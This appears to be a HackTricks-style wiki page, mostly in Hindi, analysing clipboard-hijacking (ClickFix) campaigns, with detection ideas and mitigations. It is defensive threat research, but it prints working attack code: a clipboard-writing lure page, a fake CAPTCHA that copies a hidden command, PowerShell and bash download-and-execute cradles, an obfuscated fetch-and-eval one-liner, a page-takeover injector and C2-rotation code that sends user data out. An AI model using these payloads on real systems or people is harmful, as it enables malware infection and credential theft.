# Clipboard Hijacking (Pastejacking) Attacks

> "ऐसी कोई चीज़ कभी paste न करें जिसे आपने स्वयं copy नहीं किया है।" – पुरानी, लेकिन अब भी मान्य सलाह

## Overview

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि users आमतौर पर commands को inspect किए बिना copy-and-paste करते हैं। एक malicious web page (या कोई भी JavaScript-capable context, जैसे Electron या Desktop application) attacker-controlled text को programmatically system clipboard में रखता है। Victims को, आमतौर पर carefully crafted social-engineering instructions के ज़रिए, **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाने या terminal खोलकर clipboard content को *paste* करने के लिए प्रेरित किया जाता है, जिससे arbitrary commands तुरंत execute हो जाते हैं।

क्योंकि **कोई file download नहीं होती और कोई attachment open नहीं किया जाता**, इसलिए यह technique अधिकांश e-mail और web-content security controls को bypass कर देती है, जो attachments, macros या direct command execution को monitor करते हैं। इसी कारण यह attack NetSupport RAT, Latrodectus loader या Lumma Stealer जैसे commodity malware families deliver करने वाले phishing campaigns में popular है।<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

एक अन्य **clipboard hijacking** variant commands को paste नहीं करता: यह तब तक wait करता है जब तक victim कोई **cryptocurrency wallet address** copy नहीं करता, फिर paste से ठीक पहले उसे silently attacker-controlled address से बदल देता है। यह लंबे wallet formats के विरुद्ध विशेष रूप से effective है, क्योंकि users अक्सर केवल पहले/अंतिम characters verify करते हैं।<sup>[[8]](#references)</sup>

Common real-world traits:
- **Thin loader + nested payload**: दिखाई देने वाला app/exe legitimate trading या "profit" tool जैसा दिखता है, जबकि वास्तविक clipper bundle के अंदर अधिक गहराई में छिपा होता है (उदाहरण के लिए एक .NET loader nested Rust payload launch करता है)।
- **Regex-driven replacement**: malware `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` जैसी strings या generic **44-character Solana-like** strings को match करता है और उन्हें attacker wallets से rewrite कर देता है।
- **Wallet rotation at scale**: आधुनिक Windows samples एक single static address के बजाय प्रति currency **हज़ारों** replacement wallets embed कर सकते हैं, जिससे प्रत्येक theft के बाद wallet reputation burn कम होता है।<sup>[[8]](#references)</sup>

### Windows clipper flow

एक common implementation एक hidden window होती है, जो **`AddClipboardFormatListener`** के साथ registered होती है। प्रत्येक clipboard update पर malware आमतौर पर निम्न calls करता है:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → current clipboard data तक access।
- **`GetClipboardData`** → text read करना।
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string को attacker value से replace करना।

Minimal hunting regexes frequently seen in clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-level persistence प्रभाव डालने के लिए पर्याप्त है। देखा गया एक pattern यह है:<sup>[[8]](#references)</sup>
- **`%APPDATA%\silke\silke.exe`** में payload कॉपी करना
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` के अंतर्गत **Startup-folder LNK** बनाना

Detection ideas:
- ऐसे processes जो लगातार clipboard APIs को call करते हैं और साथ ही `%APPDATA%` तथा user **Startup** folder में लिखते हैं।
- नए LNK/executable का बनना, जिसके बाद wallet-address clipboard rewrites हों।
- ऐसे archives या fake-software bundles जिनमें कई unused files और एक छोटा launcher हो, जो nested binary शुरू करता हो।

### macOS में social-engineered quarantine removal + LaunchAgent persistence

macOS पर कुछ campaigns **`unlocker.command`** helper भेजते हैं और victim को right-click → **Open** करने का निर्देश देते हैं, यदि Gatekeeper app को damaged या unidentified developer से होने की चेतावनी देता है। यह script केवल quarantine हटाती है और पास के `.app` को launch करती है:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
यह **Gatekeeper exploit** नहीं है; यह एक **social-engineered quarantine bypass** है, जो इस तथ्य का दुरुपयोग करता है कि Gatekeeper के निर्णय `com.apple.quarantine` xattr पर निर्भर करते हैं।<sup>[[8]](#references)</sup>

Execution के बाद, clipper current user के रूप में इस प्रकार persist कर सकता है:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` और `KeepAlive` वाला LaunchAgent

एक उपयोगी defensive detail यह है कि कुछ samples **self-healing watchdog** लागू करते हैं, जो हर लगभग 30 सेकंड में LaunchAgent और wrapper को फिर से लिखता है। यदि आप running process को kill किए बिना पहले plist हटाते हैं, तो malware उसे तुरंत फिर से बना सकता है।<sup>[[8]](#references)</sup> Safe cleanup order:
1. Active clipper process को kill करें।
2. LaunchAgent plist को unload/delete करें।
3. `~/launch.sh` और copied payload को delete करें।

### Delivery note: fake reputation एक force multiplier के रूप में

इस family के लिए malware स्वयं technically simple रह सकता है, जबकि **distribution layer** मुख्य काम करती है: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views और benign-looking VirusTotal comments/votes का उपयोग binary को execution से पहले trustworthy दिखाने के लिए किया जाता है।<sup>[[8]](#references)</sup>

## Forced copy buttons और hidden payloads (macOS one-liners)

कुछ macOS infostealers installer sites (जैसे Homebrew) को clone करते हैं और **“Copy” button का उपयोग अनिवार्य करते हैं**, ताकि users केवल visible text को highlight न कर सकें। Clipboard entry में expected installer command के साथ appended Base64 payload होता है (जैसे, `...; echo <b64> | base64 -d | sh`), इसलिए एक single paste दोनों को execute करता है, जबकि UI extra stage को छिपा देता है।<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
पुराने campaigns में `document.execCommand('copy')` का उपयोग किया जाता था, जबकि नए campaigns asynchronous **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करते हैं।<sup>[[2]](#references)</sup>

## ClickFix / ClearFake Flow

1. User किसी typosquatted या compromised साइट (जैसे `docusign.sa[.]com`) पर जाता है।
2. Injected **ClearFake** JavaScript `unsecuredCopyToClipboard()` helper को call करता है, जो चुपचाप Base64-encoded PowerShell one-liner को clipboard में store कर देता है।
3. HTML instructions victim को बताती हैं: *“**Win + R** दबाएँ, command paste करें और issue को resolve करने के लिए Enter दबाएँ।”*
4. `powershell.exe` execute होता है और एक archive download करता है, जिसमें एक legitimate executable और एक malicious DLL होती है (classic DLL sideloading)।
5. Loader अतिरिक्त stages को decrypt करता है, shellcode inject करता है और persistence install करता है (जैसे scheduled task) – और अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।<sup>[[1]](#references)</sup>

### NetSupport RAT Chain का उदाहरण
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) अपनी directory में `msvcp140.dll` खोजता है।
* Malicious DLL **GetProcAddress** का उपयोग करके APIs को dynamically resolve करता है, **curl.exe** के माध्यम से दो binaries (`data_3.bin`, `data_4.bin`) download करता है, rolling XOR key `"https://google.com/"` का उपयोग करके उन्हें decrypt करता है, final shellcode को inject करता है और **NetSupport RAT** के `client32.exe` को `C:\ProgramData\SecurityCheck_v1\` में unzip करता है।<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** से `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader को execute करता है
3. MSI payload प्राप्त करता है → signed application के बगल में `libcef.dll` डालता है → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA के माध्यम से Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** call एक छिपी हुई PowerShell script लॉन्च करता है, जो `PartyContinued.exe` प्राप्त करती है, `Boat.pst` (CAB) को extract करती है, `extrac32` और file concatenation के माध्यम से `AutoIt3.exe` को पुनर्निर्मित करती है और अंततः एक `.a3x` script चलाती है, जो browser credentials को `sumeriavgv.digital` पर exfiltrate करती है।<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix campaigns file downloads को पूरी तरह छोड़ देती हैं और victims को एक one-liner paste करने का निर्देश देती हैं, जो WSH के माध्यम से JavaScript fetch और execute करती है, उसे persist करती है और C2 को daily rotate करती है। Observed chain का एक उदाहरण:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- Casual inspection को विफल करने के लिए Obfuscated URL को runtime पर reverse किया जाता है।
- JavaScript स्वयं को Startup LNK (WScript/CScript) के माध्यम से persist करता है और current day के आधार पर C2 चुनता है — जिससे domain rotation तेज़ी से संभव होती है।<sup>[[3]](#references)</sup>

Date के आधार पर C2s को rotate करने के लिए उपयोग किया गया Minimal JS fragment:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
अगला चरण आमतौर पर एक loader deploy करता है, जो persistence स्थापित करता है और एक RAT (जैसे, PureHVNC) लाता है, अक्सर TLS को hardcoded certificate पर pin करता है और traffic को chunks में बाँटता है।<sup>[[3]](#references)</sup>

इस variant के लिए विशेष Detection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (या `cscript.exe`)।
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` में LNK, जो `%TEMP%`/`%APPDATA%` के अंतर्गत JS path के साथ WScript/CScript को invoke करता है।
- Registry/RunMRU और command-line telemetry में `.split('').reverse().join('')` या `eval(a.responseText)` शामिल होना।
- लंबे command lines के बिना long scripts feed करने के लिए बड़े stdin payloads के साथ बार-बार `powershell -NoProfile -NonInteractive -Command -` चलना।
- Scheduled Tasks, जो बाद में LOLBins जैसे `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` को updater-जैसे task/path (जैसे, `\GoogleSystem\GoogleUpdater`) के अंतर्गत execute करते हैं।

Threat hunting
- Daily-rotating C2 hostnames और URLs, जिनमें `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern हो।
- Clipboard write events के बाद Win+R paste और फिर तुरंत `powershell.exe` execution को correlate करें।

Blue-teams clipboard, process-creation और registry telemetry को मिलाकर pastejacking abuse का सटीक पता लगा सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** commands का history रखता है – असामान्य Base64 / obfuscated entries देखें।
* Security Event ID **4688** (Process Creation), जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` इनमें से हो: { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }।
* Event ID **4663**, `%LocalAppData%\Microsoft\Windows\WinX\` या temporary folders के अंतर्गत file creations के लिए, suspicious 4688 event से ठीक पहले।
* EDR clipboard sensors (यदि उपलब्ध हों) – `Clipboard Write` के तुरंत बाद नए PowerShell process को correlate करें।

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns बड़े पैमाने पर fake CDN/browser verification pages ("Just a moment…", IUAM-style) बनाते हैं, जो users को अपने clipboard से OS-specific commands को native consoles में copy करने के लिए मजबूर करते हैं। इससे execution browser sandbox से बाहर चला जाता है और यह Windows तथा macOS दोनों पर काम करता है।<sup>[[4]](#references)</sup>

Builder-generated pages की मुख्य विशेषताएँ
- Payloads को अनुकूलित करने के लिए `navigator.userAgent` के माध्यम से OS detection (Windows PowerShell/CMD बनाम macOS Terminal)। Illusion बनाए रखने के लिए unsupported OS हेतु optional decoys/no-ops।
- Benign UI actions (checkbox/Copy) पर automatic clipboard-copy, जबकि visible text clipboard content से अलग हो सकता है।
- Mobile blocking और step-by-step instructions वाला popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter।
- Compromised site के DOM को Tailwind-styled verification UI से overwrite करने के लिए optional obfuscation और single-file injector (नए domain registration की आवश्यकता नहीं)।<sup>[[4]](#references)</sup>

उदाहरण: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Initial run की macOS persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` का उपयोग करें, ताकि terminal बंद होने के बाद भी execution जारी रहे और visible artifacts कम हों।<sup>[[4]](#references)</sup>

Compromised sites पर In-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lures के लिए विशिष्ट Detection और hunting ideas
- Web: वे Pages जो verification widgets को Clipboard API से bind करते हैं; displayed text और clipboard payload के बीच mismatch; `navigator.userAgent` branching; suspicious contexts में Tailwind + single-page replace।
- Windows endpoint: browser interaction के तुरंत बाद `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` से batch/MSI installers का execution।
- macOS endpoint: browser events के आसपास Terminal/iTerm द्वारा `bash`/`curl`/`base64 -d` को spawn करना, साथ में `nohup`; terminal बंद होने के बाद भी background jobs का चलते रहना।
- `RunMRU` Win+R history और clipboard writes को बाद में होने वाले console process creation के साथ correlate करें।

Supporting techniques के लिए यह भी देखें

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sites को compromise करना और loader JavaScript inject करना जारी रखता है, जो external hosts (Cloudflare Workers, GitHub/jsDelivr) को chain करता है और वर्तमान lure logic प्राप्त करने के लिए blockchain “etherhiding” calls (जैसे Binance Smart Chain API endpoints, जैसे `bsc-testnet.drpc[.]org` पर POSTs) का भी उपयोग करता है। हाल के overlays में fake CAPTCHAs का भारी उपयोग किया जाता है, जो users को कुछ भी download करने के बजाय one-liner (T1204.004) को copy/paste करने का निर्देश देते हैं।<sup>[[6]](#references)</sup>
- Initial execution को signed script hosts/LOLBAS को तेजी से delegate किया जा रहा है। January 2026 chains में पहले के `mshta` usage को built-in `SyncAppvPublishingServer.vbs` से बदला गया, जिसे `WScript.exe` के माध्यम से execute किया गया और remote content fetch करने के लिए aliases/wildcards वाले PowerShell-जैसे arguments pass किए गए:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` signed है और सामान्यतः App-V द्वारा उपयोग की जाती है; `WScript.exe` और असामान्य arguments (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) के साथ जोड़े जाने पर यह ClearFake के लिए high-signal LOLBAS stage बन जाती है।<sup>[[6]](#references)</sup>
- February 2026 में fake CAPTCHA payloads फिर से pure PowerShell download cradles पर वापस चले गए। दो live examples:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- पहला chain एक in-memory `iex(irm ...)` grabber है; दूसरा `WinHttp.WinHttpRequest.5.1` के माध्यम से stages करता है, एक अस्थायी `.ps1` लिखता है, फिर hidden window में `-ep bypass` के साथ launch करता है।<sup>[[6]](#references)</sup>

इन variants के लिए Detection/hunting tips
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` या clipboard writes/Win+R के तुरंत बाद PowerShell cradles।
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, या raw IP `iex(irm ...)` patterns।
- Network: web browsing के तुरंत बाद script hosts/PowerShell से CDN worker hosts या blockchain RPC endpoints को outbound requests।
- File/registry: `%TEMP%` के अंतर्गत temporary `.ps1` creation, साथ में इन one-liners वाले RunMRU entries; external URLs या obfuscated alias strings के साथ signed-script LOLBAS (WScript/cscript/mshta) के execution पर block/alert करें।

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Recent Red Canary telemetry से पता चलता है कि stable indicator **एक exact command नहीं**, बल्कि **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, और **immediate execution** का संयोजन है।<sup>[[7]](#references)</sup>

### Notable operator patterns

- **Paste confirmation telemetry**: कुछ payloads वास्तविक stage से पहले `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` call करते हैं। इससे window को छोटा और quiet रखते हुए user interaction की पुष्टि होती है।
- **Fake verification comments**: PowerShell one-liners में `# Security check ✔️ I'm not a robot Verification ID: 138105` जैसी strings जोड़ी जा सकती हैं, ताकि Run / `cmd.exe` / PowerShell history में paste किए जाने के बाद भी command CAPTCHA-related दिखे।
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` command line में static URL से बचता है, जबकि in-memory download-and-execute करता रहता है।
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` unusual casing और flags में Unicode-जैसे characters का दुरुपयोग करता है, ताकि brittle detections को bypass किया जा सके और फिर भी `msiexec.exe` जैसा दिखाई दे।
- **Caret-escaped LOLBin chains**: `cmd.exe` `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`) के माध्यम से keywords छिपा सकता है, nested shell को minimized शुरू कर सकता है, attacker content को `.pdf` जैसे benign extension के साथ save कर सकता है, और फिर उसे `mshta` के माध्यम से execute कर सकता है।<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) disable करें या user gesture आवश्यक करें।
2. Security awareness – users को sensitive commands *type* करना या पहले उन्हें text editor में paste करना सिखाएं।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control का उपयोग arbitrary one-liners को block करने के लिए करें।
4. Network controls – known pastejacking और malware C2 domains को outbound requests से block करें।

## Related Tricks

* **Discord Invite Hijacking** अक्सर users को malicious server में लुभाने के बाद उसी ClickFix approach का दुरुपयोग करता है:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
